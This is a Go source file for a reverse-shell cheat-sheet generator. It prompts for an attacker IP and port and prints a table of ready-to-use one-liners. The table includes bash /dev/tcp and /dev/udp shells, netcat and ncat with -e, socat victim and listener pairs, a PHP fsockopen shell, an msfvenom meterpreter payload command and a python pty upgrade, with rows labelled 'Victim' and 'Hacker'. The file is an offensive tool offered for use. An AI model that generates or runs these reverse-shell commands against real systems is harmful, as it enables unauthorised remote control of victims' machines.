package main

import (
    "fmt"
    "github.com/alexeyco/simpletable"
    "github.com/fatih/color"
    "log"
    "strings"
)

func getArgs() (string, string) {
    var (
        ip   string
        port string
    )

    fmt.Printf("IP: ")
    _, err := fmt.Scan(&ip)
    if err != nil {
        log.Fatal("Input ip err:", err)
    }
    fmt.Printf("Port: ")
    _, err = fmt.Scan(&port)
    if err != nil {
        log.Fatal("Input port err:", err)
    }
    return ip, port
}

func echoTable(ip string, port string) {
    var (
        data = [][]interface{}{
            {1, "Bash TCP # Victim", "bash -i >& /dev/tcp/IP/Port 0>&1"},
            {2, "Bash TCP # Victim", "/bin/bash -i > /dev/tcp/IP/Port 0<& 2>&1"},
            {3, "Bash TCP # Victim", "exec 5<>/dev/tcp/IP/Port;cat <&5 | while read line; do $line 2>&5 >&5; done"},
            {4, "Bash TCP # Victim", "exec /bin/sh 0</dev/tcp/IP/Port 1>&0 2>&0"},
            {6, "Bash UDP # Victim", "sh -i >& /dev/udp/IP/Port 0>&1"},
            {7, "Bash UDP # Listener", "nc -u -lvp Port"},
            {8, "Netcat", "nc -e /bin/sh IP Port"},
            {9, "Netcat", "nc -c bash IP Port"},
            {10, "Ncat", "ncat IP Port -e /bin/bash"},
            {11, "Ncat", "ncat --udp IP Port -e /bin/bash"},
            {12, "Socat #1 Victim", "socat tcp-connect:IP:Port exec:'bash -li',pty,stderr,setsid,sigint,sane"},
            {13, "Socat #1 Listener", "socat file:`tty`,raw,echo=0 TCP-L:Port"},
            {14, "Socat #2 Victim", "socat tcp-listen:Port system:bash,pty,stderr"},
            {15, "Socat #2 Hacker", "socat - tcp:IP:Port"},
            {16, "Socat # Victim", "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:Port"},
            {17, "PHP", "php -r '$sock=fsockopen(IP,Port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"},
            {18, "Metasploit # Meterpreter", "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=Port -f exe > shell.exe"},
            {19, "tty", "python -c 'import pty;pty.spawn(\"/bin/sh\")'"},
        }
    )

    table := simpletable.New()

    table.Header = &simpletable.Header{
        Cells: []*simpletable.Cell{
            {Align: simpletable.AlignCenter, Text: "#"},
            {Align: simpletable.AlignCenter, Text: "Type"},
            {Align: simpletable.AlignCenter, Text: "Command"},
        },
    }

    for _, row := range data {
        replacer := strings.NewReplacer("IP", ip, "Port", port)
        cmd := replacer.Replace(row[2].(string))
        r := []*simpletable.Cell{
            {Align: simpletable.AlignRight, Text: fmt.Sprintf("%d", row[0].(int))},
            {Text: row[1].(string)},
            {Text: cmd},
        }
        table.Body.Cells = append(table.Body.Cells, r)
    }

    table.SetStyle(simpletable.StyleUnicode)
    color.Cyan(table.String())
}

func main() {
    ip, port := getArgs()
    echoTable(ip, port)
}
